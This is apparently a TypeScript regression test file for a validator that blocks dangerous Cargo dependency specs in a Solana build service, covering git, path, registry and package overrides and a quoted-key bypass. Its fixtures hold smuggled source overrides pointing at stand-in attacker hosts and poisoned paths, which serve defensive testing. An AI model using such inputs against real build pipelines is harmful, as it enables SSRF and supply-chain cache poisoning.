/**
 * B1 regression — `validateAnchorExtraDeps` strictly bounds what
 * `cargo fetch` will pull from the network during the differential
 * warmup. The warmup runs OUTSIDE the sandbox; without this validator
 * an attacker-controlled request body could `{ git = "https://..." }`
 * arbitrary URLs (egress recon) or land typosquatted crate names in
 * the shared $CARGO_HOME (cache poisoning).
 *
 * Invariants this suite locks:
 *   1. Empty + missing inputs are accepted (sniffer-only path stays working).
 *   2. Allowlisted crate names with bare version pins pass.
 *   3. Allowlisted names with feature flags pass.
 *   4. Off-allowlist crate names throw AnvilError(VALIDATION_FAILED, 400).
 *   5. Banned source-override keys (git, path, branch, tag, rev,
 *      registry, package) throw — even on allowlisted crate names.
 *   6. Banned keys with whitespace / mixed case / quoting throw.
 *   7. Malformed lines (no =, weird chars) throw.
 *
 * The validator runs at the route boundary AND inside buildAnchor() as
 * belt-and-suspenders. Both call sites benefit from the same test
 * matrix.
 */
import { describe, test, expect } from "bun:test";
import { validateAnchorExtraDeps, assertScaffoldDepsSafe } from "../src/build/differential-build.ts";
import { AnvilError } from "../src/errors.ts";

function expectThrowsAnvilError(fn: () => unknown, matchSubstring: string): void {
  try {
    fn();
    throw new Error(`validator should have thrown for: ${matchSubstring}`);
  } catch (err) {
    expect(err).toBeInstanceOf(AnvilError);
    const aerr = err as AnvilError;
    expect(aerr.statusCode).toBe(400);
    expect(`${aerr.message} ${aerr.details ?? ""}`.toLowerCase())
      .toContain(matchSubstring.toLowerCase());
  }
}

describe("validateAnchorExtraDeps — allowlist", () => {
  test("empty string is a no-op", () => {
    expect(validateAnchorExtraDeps("")).toBe("");
    expect(validateAnchorExtraDeps("   ")).toBe("   ");
  });

  test("bare allowlisted version pin passes", () => {
    expect(validateAnchorExtraDeps(`anchor-spl = "0.31"`)).toBeTruthy();
    expect(validateAnchorExtraDeps(`spl-token = "4.0"`)).toBeTruthy();
    expect(validateAnchorExtraDeps(`pyth-sdk-solana = "0.10"`)).toBeTruthy();
  });

  test("allowlisted name with table-shape features passes", () => {
    const input = `anchor-spl = { version = "0.31", features = ["token_2022", "metadata"] }`;
    expect(validateAnchorExtraDeps(input)).toBe(input);
  });

  test("multi-line block of allowlisted deps passes", () => {
    const input = [
      `anchor-spl = { version = "0.31", features = ["token_2022"] }`,
      `bytemuck = { version = "1.13", features = ["derive"] }`,
      `mpl-token-metadata = "5.1"`,
    ].join("\n");
    expect(validateAnchorExtraDeps(input)).toBe(input);
  });

  test("# comments are ignored", () => {
    const input = `# trusted dep`;
    expect(validateAnchorExtraDeps(input)).toBe(input);
  });
});

describe("validateAnchorExtraDeps — refusals", () => {
  test("off-allowlist crate name → 400", () => {
    expectThrowsAnvilError(
      () => validateAnchorExtraDeps(`random-typosquat = "1.0"`),
      "not on the differential-build allowlist",
    );
  });

  test("git source override → 400 (even on allowlisted name)", () => {
    expectThrowsAnvilError(
      () => validateAnchorExtraDeps(`anchor-spl = { git = "https://attacker.example.com/evil-anchor-spl" }`),
      "git",
    );
  });

  test("path source override → 400", () => {
    expectThrowsAnvilError(
      () => validateAnchorExtraDeps(`anchor-spl = { path = "/tmp/poisoned" }`),
      "path",
    );
  });

  test("branch override → 400", () => {
    expectThrowsAnvilError(
      () => validateAnchorExtraDeps(`anchor-spl = { version = "0.31", branch = "evil" }`),
      "branch",
    );
  });

  test("registry override → 400 (alt registry trust)", () => {
    expectThrowsAnvilError(
      () => validateAnchorExtraDeps(`anchor-spl = { version = "0.31", registry = "evil-registry" }`),
      "registry",
    );
  });

  test("package-rename smuggling → 400", () => {
    expectThrowsAnvilError(
      () => validateAnchorExtraDeps(`anchor-spl = { version = "0.31", package = "evil-crate" }`),
      "package",
    );
  });

  test("tag / rev / branch all refused even alongside version", () => {
    for (const key of ["tag", "rev", "branch"] as const) {
      expectThrowsAnvilError(
        () => validateAnchorExtraDeps(`bytemuck = { version = "1.13", ${key} = "X" }`),
        key,
      );
    }
  });

  test("malformed line (no = sign) → 400", () => {
    expectThrowsAnvilError(
      () => validateAnchorExtraDeps(`anchor-spl 0.31`),
      "malformed",
    );
  });

  test("invalid crate-name characters → 400", () => {
    expectThrowsAnvilError(
      () => validateAnchorExtraDeps(`crate$with$dollar = "1.0"`),
      "invalid",
    );
  });

  test("whitespace + mixed-case banned keys still match", () => {
    // The regex is case-insensitive and tolerates the spec writer
    // inserting whitespace around the '='. Both forms should refuse.
    expectThrowsAnvilError(
      () => validateAnchorExtraDeps(`bytemuck = {   GIT   = "https://x" }`),
      "git",
    );
    expectThrowsAnvilError(
      () => validateAnchorExtraDeps(`bytemuck = {Branch="evil"}`),
      "branch",
    );
  });

  test("mixing allowed + denied — denied wins", () => {
    const input = [
      `anchor-spl = "0.31"`,
      `evil = { git = "https://example.com/evil" }`,
    ].join("\n");
    expectThrowsAnvilError(() => validateAnchorExtraDeps(input), "not on");
  });

  test("quoted crate name still validates", () => {
    // TOML allows `"foo" = "1.0"`. Strip quotes before allowlist match.
    expectThrowsAnvilError(
      () => validateAnchorExtraDeps(`"evil-crate" = "1.0"`),
      "not on",
    );
    // Allowlisted-and-quoted should pass.
    expect(validateAnchorExtraDeps(`"anchor-spl" = "0.31"`)).toBeTruthy();
  });
});

describe("validateAnchorExtraDeps — quoted-key bypass (SSRF)", () => {
  // The banned-key regex `\bgit\s*=` could not see a QUOTED key: the closing
  // quote in `"git" =` breaks the git→= adjacency, so `{ "git" = "attacker" }`
  // sailed through and cargo cloned the attacker URL during the out-of-sandbox
  // fetch. The allowlist parses KEYS, so quoting no longer helps.
  test(`double-quoted "git" key → 400`, () => {
    expectThrowsAnvilError(
      () => validateAnchorExtraDeps(`spl-memo = { "git" = "https://attacker.tld/evil-spl-memo" }`),
      "git",
    );
  });

  test(`single-quoted 'path' key → 400`, () => {
    expectThrowsAnvilError(
      () => validateAnchorExtraDeps(`spl-memo = { 'path' = "/tmp/poisoned" }`),
      "path",
    );
  });

  test(`quoted "package" rename alongside a valid version → 400`, () => {
    expectThrowsAnvilError(
      () => validateAnchorExtraDeps(`bytemuck = { version = "1", "package" = "totally-evil-crate" }`),
      "package",
    );
  });

  test("a value string containing '=' or ',' does not spawn a phantom key", () => {
    // `features = ["a=b,c"]` is allowed — the parser must not treat the inner
    // '=' as a key delimiter and reject a made-up key.
    expect(validateAnchorExtraDeps(`anchor-spl = { version = "0.31", features = ["a=b,c"] }`)).toBeTruthy();
  });

  test("default-features = false passes (allowlisted key)", () => {
    expect(validateAnchorExtraDeps(`bytemuck = { version = "1.13", default-features = false }`)).toBeTruthy();
  });

  test("an unknown non-source key (workspace) is still refused (fail-closed)", () => {
    expectThrowsAnvilError(
      () => validateAnchorExtraDeps(`bytemuck = { workspace = true }`),
      "workspace",
    );
  });
});

describe("assertScaffoldDepsSafe — client scaffold Cargo.toml (R5)", () => {
  const cargo = (body: string) => [{ path: "Cargo.toml", content: body }];

  test("a legit pinocchio/borsh scaffold passes (no crate-name allowlist)", () => {
    expect(() => assertScaffoldDepsSafe(cargo(
      `[package]\nname = "prog"\n[dependencies]\npinocchio = "0.7"\nborsh = { version = "1", features = ["derive"] }\n`,
    ))).not.toThrow();
  });

  test("non-Cargo.toml files are ignored", () => {
    expect(() => assertScaffoldDepsSafe([{ path: "src/lib.rs", content: `git = "https://x"` }])).not.toThrow();
  });

  test("flat inline-table git source → 400", () => {
    expectThrowsAnvilError(
      () => assertScaffoldDepsSafe(cargo(`[dependencies]\nevil = { git = "https://attacker.tld/x" }\n`)),
      "git",
    );
  });

  test("quoted git key in scaffold → 400", () => {
    expectThrowsAnvilError(
      () => assertScaffoldDepsSafe(cargo(`[dependencies]\nevil = { "git" = "https://attacker.tld/x" }\n`)),
      "git",
    );
  });

  test("per-crate section `[dependencies.evil]` + path → 400", () => {
    expectThrowsAnvilError(
      () => assertScaffoldDepsSafe(cargo(`[dependencies.evil]\npath = "/tmp/poison"\n`)),
      "path",
    );
  });

  test("per-crate section with only version/features passes", () => {
    expect(() => assertScaffoldDepsSafe(cargo(
      `[dependencies.borsh]\nversion = "1"\nfeatures = ["derive"]\n`,
    ))).not.toThrow();
  });

  test("build-dependencies git source is also caught", () => {
    expectThrowsAnvilError(
      () => assertScaffoldDepsSafe(cargo(`[build-dependencies]\nevil = { git = "https://x" }\n`)),
      "git",
    );
  });

  test("target-cfg dependencies git source is caught", () => {
    expectThrowsAnvilError(
      () => assertScaffoldDepsSafe(cargo(`[target.'cfg(unix)'.dependencies]\nevil = { git = "https://x" }\n`)),
      "git",
    );
  });
});
